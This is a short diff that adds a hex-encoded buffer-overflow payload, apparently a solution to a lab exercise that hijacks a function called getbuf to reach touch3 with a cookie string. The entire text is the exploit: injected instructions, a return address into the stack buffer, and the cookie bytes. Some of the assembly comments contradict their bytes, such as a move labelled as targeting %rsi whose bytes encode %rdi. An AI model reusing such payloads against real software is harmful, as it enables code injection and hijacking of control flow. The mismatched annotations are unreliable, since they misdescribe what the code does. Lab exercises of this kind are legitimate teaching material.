@@ -1,0 +1,8 @@
+48 c7 c7 fa 97 b9 59      /* mov $COOKIE, %rsi */
+48 8d 7c 24 ec            /* lea -0x14(%rsp) , %rdi */
+48 83 ec 1c               /* sub $0x1c, %rsp */
+c3 00 00 00               /* retq */
+fa 18 40 00 00 00 00 00   /* the address of `touch3` */
+35 39 62 39 39 37 66 61   /*  the string representation of your cookie `59b997fa` */
+00 00 00 00
+78 dc 61 55               /* the address of buffer on stack, when `getbuf` return, will jump there */
